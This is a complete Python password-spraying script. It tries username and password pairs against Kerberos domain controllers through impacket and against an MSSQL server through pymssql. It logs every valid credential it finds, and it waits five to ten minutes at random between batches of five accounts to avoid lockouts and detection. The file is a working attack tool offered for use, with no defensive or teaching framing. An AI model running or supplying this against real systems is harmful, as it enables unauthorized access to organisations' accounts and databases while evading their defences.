import random
import time
from datetime import datetime
from impacket.krb5.asreq import getKerberosTGT
from impacket.krb5.types import Principal
from impacket.krb5 import constants
import pymssql

# === CONFIG ===
USERNAME_FILE = 'usernames.txt'
PASSWORD_FILE = 'passwords.txt'
OUTPUT_FILE = 'spray_results.log'

KERBEROS_DCS = ['192.168.1.2', '192.168.1.24']
MSSQL_HOST = '192.168.1.22'
MIN_DELAY = 300  # 5 minutes
MAX_DELAY = 600  # 10 minutes
# ==============

def log_result(line):
    with open(OUTPUT_FILE, 'a') as f:
        f.write(f"[{datetime.now().isoformat()}] {line}\n")

def spray_kerberos(domain, username, password):
    for dc in KERBEROS_DCS:
        try:
            principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            getKerberosTGT(principal, password, domain, dc)
            log_result(f"[+] VALID KERBEROS: {domain}\\{username}:{password}")
        except Exception as e:
            if "KDC_ERR_PREAUTH_FAILED" in str(e):
                log_result(f"[-] INVALID KERBEROS: {domain}\\{username}:{password}")
            else:
                log_result(f"[!] ERROR (KRB) {domain}\\{username}:{password} - {e}")

def spray_mssql(username, password):
    try:
        conn = pymssql.connect(server=MSSQL_HOST, user=username, password=password, login_timeout=5)
        conn.close()
        log_result(f"[+] VALID MSSQL: {username}:{password}")
    except pymssql.OperationalError:
        log_result(f"[-] INVALID MSSQL: {username}:{password}")
    except Exception as e:
        log_result(f"[!] ERROR (MSSQL) {username}:{password} - {e}")

def main():
    domain = input("Enter domain name (e.g. XONGROUP): ").strip()

    with open(USERNAME_FILE) as f:
        usernames = [line.strip() for line in f if line.strip()]

    with open(PASSWORD_FILE) as f:
        passwords = [line.strip() for line in f if line.strip()]

    for password in passwords:
        log_result(f"\n[*] Attempting password: {password}")
        for i in range(0, len(usernames), 5):
            batch = usernames[i:i+5]
            for username in batch:
                spray_kerberos(domain, username, password)
                spray_mssql(username, password)
            delay = random.randint(MIN_DELAY, MAX_DELAY)
            log_result(f"[*] Sleeping {delay} seconds before next batch...\n")
            time.sleep(delay)

if __name__ == "__main__":
    main()
